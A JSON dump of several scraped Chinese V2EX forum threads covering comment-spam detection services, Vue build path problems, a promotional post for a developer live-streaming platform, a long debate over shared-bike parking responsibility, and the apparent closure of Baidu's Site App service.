{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>因为最近业务需要，正好在做这方面的调研。\n主要是防止用户大量垃圾广告，不考虑验证码或者类似的人机实现。</p>\n<p>目前发现网易易盾效果还可以，各位有没有推荐的？</p>\n</div></div>"], "reply": "5", "tittle": "有没有什么开箱即用的评论广告识别服务或者开源实现。", "comment": ["可能还是要根据业务定制", "腾讯云也有类似的 不过好贵", "我研究了下，语义基本没用，网易的原理是把文字转成拼音，比如威信 djfuuud ，满足这种模式的就判定内为广告。。。", "WordPress 自带的一个插件 Akismet 可以识别垃圾评论，这东西也有 API ，不清楚实现原理，但是效果还不错，至今各种英文垃圾评论没有漏网之鱼，不知道对中文有没有效果。", "\"抠扣（久 89 零 7898 一）\" 像这种机器如何识别？人肯定是认识的。或者像 V 友 经常使用的把 信息用 base64 来编码。如何识别？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>vue build 打包后，发现 css 路径是错的，修改后图片的路径又错了</p>\n</div></div>"], "reply": "7", "tittle": "vue 打包后文件路径 css 路径怎么处理", "comment": ["webpack 吧， Vue 只是个框架而已\r", "应该是你姿势不对", "楼上正解，用 vue 十有八九搭配 webpack ，相应的 loader 都会帮你做好。", "没用 webpack 打包吗", "姿势不对", "vue-cli 应该已经配好，如果是自己配的 webpack 请关注下在 css 的 loader 里配置 publicPath", "用 vue-cli 的话， 在 config 目录下，设置 build 的 assetsPublicPath: './',", "需要检查的地方 output publicpath loader 输出的路径和文件名"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"图片标题\" src=\"http://wx1.sinaimg.cn/mw690/6af50b6fly1fdm70dsp96j20go18gtcm.jpg\"><br>\n<b>关于码易极客直播：\n——最懂程序员的知识分享直播平台，听你想听，做你想看。</b></p>\n<p>从没想过有一天，观看直播也能从被迫选择到主动发起！</p>\n<p>码易独家 [悬赏] 机制，没有看到你想听的直播，没关系，进入大牛直播，点击发起 [悬赏] ，提交你想听的分享主题即可，剩下的交给码易！码易会根据大家对主题的投票情况，设定 [悬赏] 金额，邀请大牛或优秀工程师来为你直播分享！</p>\n<p><b>在这里，你可以收获什么：</b></p>\n<p>作为听众，不但可以学到知识，结交大牛，还可以认识更多学习路上志同道合的小伙伴！作为分享嘉宾，不但能获得悬赏金额，学到知识，得到打赏，还有满满的成就感，以及个人口碑的积累。 “再来一次”是听众对分享嘉宾能力最直接的肯定！</p>\n<p>近期直播 list 送上：\n<img alt=\"图片标题\" src=\"http://wx4.sinaimg.cn/mw690/6af50b6fly1fdm75k0xtoj20hs0vkdni.jpg\"></p>\n<p>码易直播，“听你想听”，只做“你想看的”知识分享直播平台。<br>\n欢迎每一个开发者工程师来围观，感谢 V2EX ，希望我们的直播能给每一个小伙伴带去收获，也欢迎每一个乐于分享的小伙伴体验我们的产品。感谢~</p>\n<p>2017年码易直播主题面向 [前端开发] ，语言涉及jave、javescript、node.js、Html5、React Native、Python等，分享内容分技术干货，程序人生、职场经历等等。</p>\n</div></div>"], "reply": "14", "tittle": "苹果禁止热更新，学习 ReactNative 还有没有前途？", "comment": ["666", "🐂", "add 不了，分楼继续：\r", "\r", "英雄不问出处，技术永无边界。往期做客分享的嘉宾不仅有知名大厂工程师，也有野生牛人，我们欢迎一切热爱分享的工程师们加入我们，等你们来。", "广告投到推广节点", "语言涉及 jave 、 javescript \r", "\r", "大小写不对 + 中英文间没有空格就算了, 居然还写错了[汗]", " 好的，下次知道啦~", " 谢谢指正，已更正~", "没有", " 硬广 节点不符", " 可以帮我改一下吗", "楼主，你们就只会给 ios 开发软件，不考虑安卓了？不考虑以后的系统了，你们就那么自信苹果这种封闭公司千秋万代一桶浆糊？", " 不不，就事论事，你也别生气，本次直播就是来告诉大家怎么解决 IOS 这次问题的。而且楼主从来不觉得 IOS 能一统江湖，把大 Andriod 当摆设么", " 谢谢举报。", " 能不能帮我改一下，管理大大，谢啦"]},
{"content": ["<div class=\"topic_content\">国内互联网企业还是这种简单粗暴的思维模式。</div>", "<div class=\"topic_content\">我是楼主，但不是楼下那位所谓的“这种人”。\r<br>\r<br>从你错误的把另一位当作楼主本人来回复的大段文字中，首先我可以揣测你这种人大概许多行为都是下意识的，不需要思维。资本和权力的游戏玩久了大概就是这种结果了吧。\r<br>\r<br>而我向来对权力、资本和垄断就抱有戒心，这背后的原因从你那些傲慢和无知的回复中应该可以找到答案。\r<br>\r<br>我对你们没有信心，也没有耐心。</div>", "<div class=\"topic_content\">解释一下为什么我说“还是这种简单粗暴的思维模式”：从最初的 3721 一大类流氓软件开始，到最近的 x2x 互联网业务，这些企业为了利益一直的套路就是“先占领市场再说”，而且不择手段，法律在他们眼里如同儿戏。\r<br>\r<br>这其中有些业务可能并没有挤占公共资源，但像共享单车这类业务，本质上就是打着为公众服务的幌子、以盈利为目的在挤占公共资源。\r<br>\r<br>有人说还有其他的乱停放，汽车、电动车等等。我对这些问题和你一样讨厌，但这些都是涉及到具体的个人，可能需要教育和公民素质提高来解决，是另外一个问题。\r<br>\r<br>还有一点想说，不要依赖政府。他们的存在只是为了解决社会问题，而且也不是唯一的解决手段。况且现在还有许多不作为的现象。\r<br>\r<br>至于分不清什么是公什么是私的，请先试着思考一下。\r<br>\r<br>还有说“你家房子的存在，也侵犯了别人的利益”的，我和你没话说。</div>", "<div class=\"topic_content\">楼主提出这个问题的本意是想针对单车运营这种业务表达自己意见，让那些无良企业能感受到这种压力，不要为所欲为。因为有时候你不发声，一些人就会掩耳盗铃式的忽略你的存在。\r<br>\r<br>看到大家能相对平和地争论，楼主也有许多话要说。\r<br>\r<br>首先，直觉很重要。直觉大概是大量的经验加上理性的思维以后形成的一种潜意识的判断能力。\r<br>其次，当我们判断一件事情对错的时候，一定是基于某些预先设定的前提。这样才能形成不矛盾的结果。\r<br>第三，类比是用一个更通俗易懂的事物来说明同类的另一些事物，但往往会发现用来类比的这个事物与要说明的事物之间其实有许多不同之处，可能把问题引向另一个方向。所以一定要理清他们之间的共性，能不能用来说明原始的问题。\r<br>此外，规则的制定或者说法律的制定，一定是综合考虑各种利益，从最基本的原则和前提，到各种具体的规定。但是它们之间一定是不能矛盾的。这大概可能叫法理吧。\r<br>\r<br>单车乱停看上去直接的原因肯定是使用者的责任，这当然没错。但当法律没有办法、或者很难或者成本很高的时候，就会退而求其次，找直接相关责任者。这就像监护人责任一样。\r<br>单车从权属上属于那些公司，它们有义务保证不占用公共资源。</div>"], "reply": "198", "tittle": "那些做共享单车的就没考虑乱停车问题吗？", "comment": [" \r", "\r", "他们不是没想过\r", "\r", "恰恰相反，他们想过。\r", "\r", "无偿 /低价占用公共资源，再利用低收入人群+投资人关系倒逼政府不做处理。\r", "\r", "这就是他们一开始的商业模式。\r", "\r", "这本来就不是什么新鲜行当。", " 汽车厂商也没义务去解决汽车停在哪里的问题啊", " \r", "\r", "懒政？\r", "\r", "这都能怪到懒症头上？\r", "\r", "知道 76 条么？\r", "\r", "不过是“弱势群体”的优势，然后凭借“弱势群体”的身份要求更多而已。\r", "\r", "个人可以无视秩序，这在任何一个国家都难以彻底管理。\r", "\r", "公司都可以无视秩序了，这才呵呵。", " 制定管理条例谁不会？关键是执法者有严格执法吗？\r", "平时就完全不顾公共利益的人，你觉得他把共享单车乱停乱放还奇怪？\r", "我也经常骑车，从来都是按规矩停放。\r", "车子听到哪里，那是人干出来，不是共享单车公司做出来的。\r", "汽车厂商也没有义务去教你如何在路上文明行驶和文明停车。", " 弱势不弱势就应该执法者的执法公正性？骑电瓶车闯红灯被撞，难道就应该因为弱势来判机动车也有责任？", "什么\r", "人之初，性本善\r", "屁啦", " \r", "\r", "说的全世界的法律都能得到贯彻一样。\r", "\r", "另外，骑电瓶车闯红灯被撞，难道就应该因为弱势来判机动车也有责任？\r", "\r", "的确是这样，除非能证明非机动车故意，不然机动车至少 10%责任。\r", "\r", "如果不熟悉道路交通安全法，请不要举相关例子。", "按楼主这种思维方式来看待国外的互联网公司，也可以得出 Google 的无人驾驶汽车在加州上路也是简单粗暴的思维方式，因为 Google 完全没有考虑到别人的人身安危问题。", " 是呀。。我也没说可以因为这个就乱停乱放了，已所不欲勿施于人吧，反正我自己是每次用完共享单车都会放到公共停车位，至于那些乱停乱放的人，只能说他们的意识不强，还需要提高吧", " 呵呵 你看到我哪句话同意乱停放是对的了？ 让你少脑补", " 再多做做阅读理解", " 世界上没有法律严格执行就是我国可以这么执法的理由？不跟先进看齐，反而只要有比我国的差的例子，就觉得我们这么执法尺度很正确了？\r", "问题是这至少 10%，我是没见过非机动车承担过剩下的那至多 90%责任的。\r", "还有，非机动车追尾正常行驶的机动车，我也见过判机动车有责任的，我不熟悉交通安全法，请你给我讲下呗。", " 说别的不熟悉交通法时，最好先确认下再说，机动车无责，是至多 10%，而不是最少。\r", "《中华人民共和国道路交通安全法》第七十六条：机动车发生交通事故造成人身伤亡、财产损失的，由保险公司在机动车第三者责任强制保险责任限额范围内予以赔偿；不足的部分，按照下列规定承担赔偿责任：　\r", "（一）机动车之间发生交通事故的，由有过错的一方承担赔偿责任；双方都有过错的，按照各自过错的比例分担责任。　\r", "（二）机动车与非机动车驾驶人、行人之间发生交通事故，非机动车驾驶人、行人没有过错的，由机动车一方承担赔偿责任；有证据证明非机动车驾驶人、行人有过错的，根据过错程度适当减轻机动车一方的赔偿责任；机动车一方没有过错的，承担不超过百分之十的赔偿责任。", "那些做菜刀的就没考虑乱砍人问题吗？", "只要遇到了问题就是好的，总会慢慢变好。第一是体现了国民的素质，乱停车在于自律和管理。", "新生事物总会有点问题的。\r", "\r", "那车子、菜刀做对比就不太好了，毕竟买卖完成之后所有权发生了转换，共享单车的所有权一直都是 mobike 、 ofo 的。", " \r", "\r", "我说的很清楚，你不熟悉道路交通安全法\r", "\r", "这个说的是机动车无责的情况。\r", "\r", "机动车是否有责任，取决于上一句话\r", "\r", "有证据证明非机动车驾驶人、行人有过错的，根据过错程度适当减轻机动车一方的赔偿责任", " \r", "\r", "我不知道为什么要和最高的比。\r", "\r", "要比自然是和中位数或者平均值比。\r", "\r", "你自己都没做到第一，对别人要求都是第一，是个什么道理？\r", "\r", "说的你上能做的更好一样。", " 车子菜刀做对比，看似因为所有权的区别，但乱停问题深究起来并不是所有权导致的。在没有共享单车之前，城市道路里还是有很多乱停乱放现象的。", " \r", "\r", "乱停当然是所有权的问题。\r", "\r", "谁的车，谁负责。", " 那就按你说的来，政府自己执法不严，那别人也可以不按规矩来啊。那提出这个问题的楼主，也没有做到做事面面俱到这个点上做到世界第一，那也就别要求共享单车公司也做到面面俱到呢？", " \r", "\r", "对不起，共享单车连平均或则中位都没做到。\r", "\r", "第一？这些公司也够好意思去想？", " 你要用刀切水果，我借给你，你杀了人，完了是我的责任。", " 我不知道你所在的城市，反正南京的共享单车，大部分人的停放都很文明，并没有影响到别人的公共利益，起码比开车的私家车做得好，我不知道这算不算到中位数。", "瞎停也比电动车好太多了。电动车才是毒瘤 能大幅度取代的话 这点代价完全可以接受，电动车根本 载人 闯红灯 逆行 占人行道  超速 根本无法监管。自行车无论怎么样都安全点。说句不好听的 一个小黄车再不行搬都搬到旁边了哪那么大火气 一个电动车停你店门口 一点脾气没有。", " \r", "\r", "呵呵，可惜你借出去的本来就是枪。\r", "\r", "另外，共享单车只要放在马路上就影响其他人了，还好意思说做得好？", "都停哪了？杭州感觉还好啊 都停在路边 有人停路中间了？😂", "  你的意思是 政府不去约束这些公司 这些公司也能良心发现 behave themselves?", "国内真想解决这样的问题 就是要让政府干活啊", " \r", "\r", "\r", "\r", "这样？", " #19 我之前骑武汉城投的江城易单车公共自行车也遇到过数次这种问题，转了好几个站点都没有空闲的停车桩。\r", "后来打电话给客服工作人员，经后台查询附近确实没有空闲停车桩，让我骑回去或者上锁（车自带锁）停在停车桩旁边，次日早上再还车，并会后台标记此订单，不需要我支付。然后我就骑回去了，扛上楼了。\r", "本来是图方便，然而扛上扛下太麻烦了，折腾数次后就再也没骑过这车。\r", "该车 1 小时内还车免费，超出一小时后按 3 元 /小时标准收费。退押金在 APP 里操作后 ", "  一定打电话联系客服工作人员才退 ", "  。", " #39 报警后警察也是和稀泥", " #52 我举报是给我加分了，至于违停会不会扣分我就不知道了，毕竟我不违停。", " #56 头上长角了是什么梗？ ", " ", "  是这样的啊 有什么问题吗", " 宁波公共自行车可以在 APP 上查询每个停车点的空余位置，这个挺好", "我国对自行车停放原来还有规定吗？一直没发现啊…", "其实我觉得吧 这个问题呢 就是一个资源不足的情况 \r", "首先 如果政府的公共自行车 完全够有的话 也就没共享单车什么事了\r", "第二 就我自己而言 我也不知道开了共享单车之后应该停在哪里 那种有自行车堆放的地方还好 靠上去就好了 就怕那种什么都没有的地方 也只能放在人行道靠马路的位置了吧。。\r", "所以 理应是让政府出台相关法律法规 规范和制止这种不文明的行为  人都是一样的 自私自利 \r", "但我也相信 仓廪实而知礼节，衣食足而知荣辱\r", "以上", " 我借出去的是水果刀，不是你所说的枪，谢谢。\r", "你家的房子存在，本来也是侵犯了别人的利益。", "靠自觉吧，", " \r", "\r", "你借出去的本来就是骑行的可以随意停的自行车。\r", "\r", "更何况，乱停车的行为是发生在别人还车之后的。", "滴滴也有乱停车啊…… uber 也有乱停车啊。", "怎没人说机动车乱停车、抢占自行车道的问题？", "肯定考虑了，并且利用了\r", "按规矩停车肯定不够“方便”啊，租都都租了，干嘛不直接骑到写字楼门口，一锁就不是我的事了，爱推走推走", "那些生产打火机的就没有考虑会有人拿打火机去放火吗？\r", "这个问题主要靠自觉和出台相关法案。", "考虑过啊. 但是还是要看个人素质问题吧..\r", "\r", "（国民素质有待增强啊", " @", " 其实你说的这个使用不明确，就恰恰说到了楼主提出的问题。\r", "我来说一下欧洲这边的一个单车出租的服务吧：\r", "\r", "首先，其中有个条款，如果还车的时候没有停放到指定区域，按照 20 欧+每公里 1 欧收取服务费。复制到国内，如果乱停一次，就收 150 块钱，你觉得还有多少人会乱停？\r", "\r", "其次，使用者使用期间，使用者需要负责认真保管自行车，如果自己原因损坏了，被盗了，总之就是还不回去了，不能让下个使用者立刻使用，要付赔偿金 75 欧。复制过来，如果使用者乱停车，但是没有还车，没关系，一方面，你要继续为每个小时付租金，另一方面，如果车子被市政拖走了，你需要自己想办法把车子捞出来，或者支付一次性的赔偿金 600 块钱。你看谁还会想要乱停？比如楼上说的停到自家小区或者公司里，进不去没关系，我也压根不想进去，直接算车辆丢失，收你 600 块钱。你看谁还会晚上把车停到自己楼道里面？\r", "\r", "此外，这边的共享单车也是通过 App 能够即使显示每个停车点取车点的单车数量的。运营者有义务保证每个停车点随时有足够的空位让你还车，也就是说不能说你到了地方想还车，没有空位，逼迫你交 20 欧的乱停费用。这样不行。而且，为了提供更好的服务，运营者是需要动态调剂，保证每个点随时都有车的。简单的说，运营者自己有大卡车，每天在不同地方转来转去，把自行车从这个点拉到另外的点。\r", "\r", "试想一下，如果这三点都能得到完全实施，会有乱停乱放么？我们先抛开市政监管这一部分，这些运营者在忙着从国外复制这个模式的时候，真的是忙忘了，忘记了复制这几点？当然不是。\r", "1. 如果收取高额的服务费，那么用户就会退却，到时候你就看每天网上不断的有人说，某某单车流氓，骗子，乱扣钱，也就不会形成现在这么高的使用热度了。\r", "2. 最关键的是，运营者不想增加自己的成本，目前，他们只需要首期投入一定的硬件成本，然后加上后期的一点点硬件软件维护，就行了，这个成本真的是很快就能收回。大货车不能进城，你让他们租很多的小货车，每天在城里转，这就太增加他们的成本了。\r", "\r", "对这些问题，投资者肯定会有疑问，运营者的商业计划书，肯定也对这些问题有描述，我都能想象，运营者是怎么回答这些问题的：“没关系，暂时没人管，我们不需要考虑这方面的成本”。一副无耻的嘴脸。\r", "所以，楼主说的很对，这些运营者就是利用现在没有成文法规的混乱期，占用社会资源和公共资源来达到自己迅速扩张的目的。", " 汽车厂商在大街上卖车?", "人家共享单车的用户守则里，不能乱停车，所以楼主的问题应该是：为什么单车软件说了不能乱停放，租车人还是乱停放，为什么乱停放后的损失是出盘方承担。", "德国慕尼黑的 MVG 也有共享自行车的服务，这边解决乱放的方式是只有当自行车停在固定的位置时，才能停止计费。至于为什么国内没这么做…可能是固定设点政府并不能配合吧", " 汽车厂商卖出去的汽车难道不上路？", " 你怎么知道乱停车是别人还车之后发生的，而不是一些人还车的时候就乱停了。\r", "去餐厅吃饭，餐厅提供给顾客的餐刀也本来就是可以随便杀人的工具。\r", "乱不乱停和用不用餐刀杀人是一个逻辑，完全靠自觉和自我承担责任。", "政府自己少做些公共自行车之类的事情，多做些停车位的规划和管理引导工作。", " 卖出去的汽车难道所有权还属于厂商?", " \r", "\r", "呵呵，强词夺理还有意思了。\r", "\r", "大概大部分人借出就是为了不骑让它停在马路上的？\r", "\r", "\r", "另外，知道什么是管制道具不？大概你随便卖匕首砍刀也是可以的？\r", "\r", "我都不明白了，我明确的说出了是单车公司而非是租借人的问题，单车公司必须解决这个问题，你还不断的狡辩，到底是处于什么语言？\r", "\r", "\r", "\r", "你能解释解释不？", "事实上共享单车大量低成本占用停车位这种公共资源这种情况，其实也是钻政府没有制定相关政策的空子。中国最近几十年的经济高速发展，很多事物的发展政府思路根本跟不上，就像现在大量在道路飞驰的电瓶车，政府到现在也没一个正面的管理办法，没有法律和条例不让符合质量标准的电瓶车上路(可能有，那就是执法问题，政府懒政)，所以，即使电瓶车造成了很多交通事故，政府也没有任何办法。\r", "同样的，也没有法律规定机构或个人购买的自行车禁止在路上停放，当然对于那些违规乱停的车辆，道路交通管理单位有权进行处理，但是对于那些停放在正常停车位中的共享单车，交警确实也没办法。\r", "\r", "所以解决这个问题的方法，我觉得不能是一刀切。就像有些人仇视机动车一样，认为机动车造成了空气污染（这个观点我不认为正确），应该限制机动车上路，这解决不了任何问题。政府有责任也有义务去想办法解决这个问题，制定管理条例，对违规停车的人进行教育和处罚，同时要求共享单车公司提供配合。\r", "\r", "突然又想到一个问题，在供电量紧张而用电确实高峰的时候，为啥很多时候要优先对居民用电供电呢，那些工业生产也按时足量缴纳电费啊，难道就因为人道，还是因为那些工厂是盈利的，而居民不盈利？所以我觉得，提出这个问题的 LZ 最好把那些私人的电瓶车问题也提出来，把他们也批评一番。", " 照你这么说，出租车公司也得停业，我可以说出租车大量占用了公共资源", " 没懂你啥意思\r", "大概大部分人借出就是为了不骑让它停在马路上的？ \r", "\r", "\r", "另外，知道什么是管制道具不？大概你随便卖匕首砍刀也是可以的？ \r", "\r", "还有，杀人还必须用管制刀具了？西餐厅的刀难道杀不了人，当然大部分是用来吃饭的。就和大部分骑车人是可以按规矩停放自行车一个道理。\r", "\r", "出租车公司解决出租车道路中间急停接客问题没？你给我解释下？", " \r", "\r", "公司行为，盈利为目的，必然和个人行为性质不同。\r", "\r", "就如同使用盗版，公司行为和个人行为也是不同的。\r", "\r", "处罚本身也该处罚物主单车公司，凭什么去处罚停车人？\r", "\r", "到底你在扯什么？", " 还有，不要说别人强词夺理，明显你就没有能力说服别人。", " 你到底在扯什么，出租车违法交通法，出租车公司被处罚了？出租车公司盈利不？", " \r", "\r", "首先，车辆当然是可以中间急停接客的，为什么不可以？\r", "\r", "车辆是不能随意临停吃饭的，所以出租车司机都要带个面包的，大概你也不知道？\r", "\r", "然后，这个自行车出租大概不是一开始就乱停在马路上的？\r", "\r", "请解释下，你到底为为共享单车公司辩解，还是骑车人辩解。\r", "\r", "如果是为共享单车辩解，请直接比较租车公司。\r", "\r", "最简单的。租车公司换车后需要押金，确保没有任何罚单后才退换。共享单车有？", " \r", "\r", "出租车在车辆还给出租车公司后，当然是处罚出租车公司的。\r", "\r", "交通发本来就规定车主对于租出去的车子很多时候有连带责任。\r", "\r", "你真以为出租车公司是这么好开的？", " \r", "\r", "我为什么要说服你？\r", "\r", "呵呵。\r", "\r", "我只是指出你逻辑上的漏洞和问题而已。\r", "\r", "说服你？你以为你是谁？", " 出租车中间急停接客？你可以急停，你可以下课，你能上客吗？不要告诉我交通法里有规定你可以在快车道上车。还有对于出租车在路上慢速巡游我没意见，违规变道靠边造成后方无经验的司机慌忙打方向后出车祸，这事少吗？\r", "\r", "出租车不违停？要不要来南京郊区地铁站看看，违停接客的还少？\r", "\r", "自行车出租一开始是乱停在马路上的？你还可以来南京看看，南京有多少自行车停放点。\r", "\r", "共享单车有处罚措施，执行实施问题而已。", " 合理的类比应该是租车公司, 你见过租车公司在路边租车的?", " 还有你作为 V 站老司机，说交通法的时候最好贴出来，我看你对之前我给你指出来的 10%责任那个错误直接视而不见了啊，当然 V 站的评论系统容易让人漏看", " \r", "\r", "\r", "如果是违停的话自然交警会扣分，罚款，触发出租车公司。\r", "\r", "大部分交通违规本来就是找车主的。\r", "\r", "然后呢？\r", "\r", "你也认同应该处罚单车公司，是吗？", " \r", "\r", "请自己爬回复，我已经回复你了。\r", "\r", "你这状况根本就不是无责。\r", "\r", "无则才是 10%以内。\r", "\r", "有责都是 10%以上，有问题？", " 出租车是长期租车，难道就可以胡乱违停？交警为啥只罚司机不罚出租车公司呢？\r", "你要没见过，你来南京，我带你看看，然后我还可以带你去曝光处理台来看看，是出租车司机缴纳罚款呢还是出租车公司派人来缴。\r", "摩拜对违停有处罚措施，执行的具体情况是另外一个方面，并不是完全没有想办法。", " 我的观点是罚车主，而不是出租车公司。", " 抱歉，是我漏看", " \r", "\r", "车主就是单车公司。", " \r", "\r", "要看处罚司机还是出租车公司很简单。\r", "\r", "如果拒不执行的话，是处理出租车公司还是司机就可以了。", " \r", "\r", "我仅仅是回复这一句：@liaoyaoheng 汽车厂商也没义务去解决汽车停在哪里的问题啊\r", "\r", "不是为了说服谁。\r", "\r", "汽车在没有卖出去之前，厂商必须解决停在哪里的问题。\r", "汽车卖出去之后， 停哪里的问题的应该由车主解决。我认为谁拥有那个“车”，谁就应该解决相关问题。\r", "\r", "单车在租出去之前，属于共享单车公司的， 公司应该解决停车问题\r", "单车在租出去期间，属于(暂时)租用者的，租用者应该解决停车问题\r", "单车归还了，属于共享单车公司的， 公司应该解决停车问题", "我在想 为什么没人做中这方面的数据收集工作 比如用一个小黄车 就填一条 牌子与密码对应的信息在数据库里面 是不是不好 还是怕有人瞎填信息", " \r", "\r", "我刚才没表达清楚，上一条回复中的车主是指实际租车司机。\r", "\r", "所以我觉得就是司机违停，罚司机，单车的骑行人违停罚停车人。这个因为受制于现实执法条件，所以可能单车违停处罚处理轻，当然出租车司机上岗之前接受的职业培训要比单车公司的骑车条约好多了，这个我不得不承认。\r", "\r", "我也不是相关利益者，只是讨论个具体问题。", " 我的意思是归还地选择上其实也是骑车人的义务。", " \r", "\r", "就机动车来说，违停都是罚车主的。\r", "\r", "具体到出租车，直接处罚的是出租车公司。出租车公司根据出车记录，查到当班司机，再让司机去处理这个违章。出租车司机在公司有大笔押金，只能去缴。\r", "\r", "租车的道理也一样。还车后还会有一笔押金。一般是信用卡预授权。\r", "\r", "处罚车主。通过合同约定押金。在押金中扣除。\r", "\r", "这才是我认为的正常途径。大部分类似（出租车，租车，甚至更接近的分时租车）行业都是这么做的。\r", "\r", "我在 58 楼把这个意思表达的还是比较清楚的。", " \r", "\r", "嗯，我同意你这个说法。\r", "\r", "所以我对押金模式有些质疑，我觉得这点应该有成熟的方案可以选择。", "虽然不是各地都是，但是共享单车在部分地区是政企合作的 PPP 项目来的；\r", "因此楼主说的“打着为公众服务的幌子、以盈利为目的在挤占公共资源”，实际上是得到了政府的支持；因此这里有个问题，你们认为“公共资源”的归属权是属于政府的呢还是怎样？\r", "\r", "所以说到底了是一个参政问题，楼主是很有想法的，何不参与到当地的基层选举，给人民带来真正的利益；\r", "\r", "今年两会今天闭幕，不像往年蛮多吓死人抢眼球的提案，有现实意义的挺多的。", "要靠素质、道德、人性的都呵呵了； \r", "倒是很讨厌 ofo ，出于自身的商业成本和利益的考虑，制造了一大批低成本，低质量自行车投放在城市中；在无监管无序状态下自行车不是被破轮胎，拔座，远看 ok 近了看不是号码被划掉，就是号码根本解不了锁；\r", "这种低成本的无素质行为， 不知道对青少年和城市文明造成多少的影响；\r", "我不认为单单靠 人的素质能避免这些情况的发生，\r", "但 ofo 这家企业出于商业成本和利益的考虑，做为服务提供者和利益获得者，自己是不是要做些什么；\r", "这算不算是 在作恶；\r", "\r", "。。。。。。\r", "\r", "我这是有多讨厌这家企业~~~~", "不是没想过，只是现在不是重点罢了。\r", "我觉着政府现在是处在观望阶段呢，你们在市场先打着，等到市场上只剩下几个寡头的时候政府就该约谈主要负责人，然后出台相关规定了，网约车业务不就这样吗。\r", "到时候共享单车要不要给政府付管理费，押金要不要有保证金账户，应该都会有具体的规定。", " 罚租车的人的前提是，出租单车的公司有提供合法的区域停放。\r", "\r", "这么多单车，出租单车公司应当提前与市政合作，租用公共区域以停放他们的单车。而这些公司流氓在根本不去做这一步，而美名曰“共享”，然后大面积占用公用用地。\r", "\r", "那些反对此观点的人的门口应当每天被这些乱停的单车塞得开不了门，然后他们的脑袋才会明白这个道理。", "我觉得可以随便停挺好的啊，要是还回归到政府举办的那些自行车的形式，我一定会说 sb 。很多事还是靠自觉，可以来阿里的园区里看下自行车使用形式，挺好的，比 mobike ofo 还好，因为 app 都不用，随骑随走。", "比乱停乱放更严重的问题，他们会在不该走的路上乱骑。\r", "本来电动车的上机动车道、逆行已经很严重了，别觉得骑自行车的就不敢，为了不上个天桥，他们敢去跟机动车对杵。\r", "烟盒上有吸烟有害健康，这些车上也应该印一个，上机动车道有害生命。\r", "坐标深圳，下班可以去南山创业路和南海大道交汇处的十字路口观摩我所说的现场。", "1. 如果找到解决乱停车的方案后再开始做, 十年内就不用做了. 这好歹也是个互联网社区, 敏捷开发怎么就变成简单粗暴了?! 不信国外做共享单车能解决这个问题, 甚至他们都不会去考虑这个问题. 相反, 国内互联网企业不是简单粗暴, 而是带着镣铐, 备案 /河蟹关键字 /不能整合谷歌等服务 /翻墙 /防刷防作弊 /积分 /..., \r", "\r", "2. 共享单车侵占的空间难道会比汽车侵占空间多? 远远不如吧. 为何总能见到人乱扔破坏单车, 骨子里还不是欺软怕硬, 划坏汽车赔不起.\r", "\r", "3. 不遵守规则随意停放主要还是个人素质问题, 我相信共享单车公司也在想办法改进. 方法是逐渐尝试改进出来的, 人群也是需要时间引导的.\r", "\r", "4. 我认为有共享单车的世界一定比没有共享单车的世界好, 就像打车软件的革命一样.", "摩拜乱停被举报会被扣分的", " 如果汽车也是共享单车这种的租赁模式的呢？", "我比较烦的是，现在好多人都在人行道上骑共享单车", "1 、我也很纳闷简单粗暴怎么就和敏捷开发划上等号了。敏捷开发相比传统的瀑布、迭代方法更强调需求的可变性、不可预见性以及应对变化的及时性，是开发团队和产品团队之间的事，作为单车用户、社会大众有必要关心你们的方法吗？如何解决乱停车问题这个需求不可预见吗？\r", "\r", "1.1 、不信国外类似业务可以解决这个问题的话，仔细阅读上面网友对国外现状的描述。\r", "\r", "2 、用另一个错误并不能证明一个错误就是对的；\r", "\r", "3 、对于一直在作恶的人怎么去相信他？而且这是简单的商业行为，我也看不出来这对人类社会多么伟大的贡献，为什么要把情感付出给他们？\r", "\r", "4 、这个命题太大了，如果加上一个条件“在你的世界里”的话，大概可能没有问题。", "抢占市场最重要，乱停乱放是用户自己的事。", " 人的本性是恶，而不是善。", "乱停乱放比黑车摩的遍地的所谓公共资源被占用要强太多太多。\r", "最少我已经从以前看到一地的摩的黑车到现在偶尔一两辆的情况了，从这个角度出发。还不赖。\r", "当然，我是开车的，所以我还是觉得这里面又出现另一个问题。。。 tm 骑自行车的可不比电动车的好哪去，哪好走走哪。。。也不管是不是自己的道。当然，这个问题是政策问题，政府部门不解决，基本无解。所以，最后一公里的问题暂时用这个方案解决，我想那些领导们也是没办法的办法", "楼主换个方向。。想想好和坏，这个问题就迎刃而解了。。。上层决策不是写代码， 010101 这样的。法律知识他们自己的东西，管不了他们。所以，对我们老百姓而言，更重要的只能是决策了。。。", "任何一个新鲜事物的出现，都是需要时间去融合。\r", "但是请不要喷中国人的素质，素质只是表象而已，只能说国人好悲催。\r", "无信，无法，无教，百年又何如?!", "那些开饭馆的就没考虑过有人随地大便的问题吗？", "用户个人乱停的还是其次，现在摩拜公司投放的自行车一下就把人行道+自行车占了大半，人和车都不好走，看着烦。比如将台路地铁站附近。", "的确这种现象丛生, 除了用户和运营商的问题, 也恰好反映了政府的不作为.\r", "我抛出另一个观点,大家看看一席里的一个半小时视频,看看其他国家的政府是怎么做的.\r", "\r", " [一席] 那些骑自行车的人，并不是买不起车。刘岱宗：完整街道 Street for All\r", "\r", "当前中国还是在迅猛发展的,某些 2/3 线城市的新区完全可以好好借鉴规划来吸引人才,这样也可以缓解全部涌向一线城市带来的各种问题,房价,人口,犯罪等等.一味的懒政 /放任自由在我眼里就是渎职罪, 但我们期待这样有远见的政府."]},
{"content": ["<div class=\"topic_content\">想把一个企业站的前端生成 wap ，省事点。。\r<br>突然发现 <a target=\"_blank\" href=\"http://siteapp.baidu.com\" rel=\"nofollow\">siteapp.baidu.com</a> 居然打不开，搜了下好像百度关闭了这个服务了。。\r<br>有类似的替代品吗？\r<br>谢谢</div>"], "reply": "10", "tittle": "site app 关闭了？还有类似的在线生成 wap 站的服务吗？", "comment": ["能开啊", "\r", "难道我打开的这个页面是假的百度 site app ？", "请把你的代理关闭。", "ERR_CONNECTION_REFUSED 没开代理。", "能打开", "我晕 我是真的打不开啊！！！！！能 Ping 通", "貌似的确是已经停止了。", "我自己修改 hosts ，改到了 site app 的一个移动的节点才能正常打开。。\r", "但是老是重复让我登录。。", "把网站数据转成接口再用 hbuild 生成", " \r", "\r", "是需要把代理打开"]},
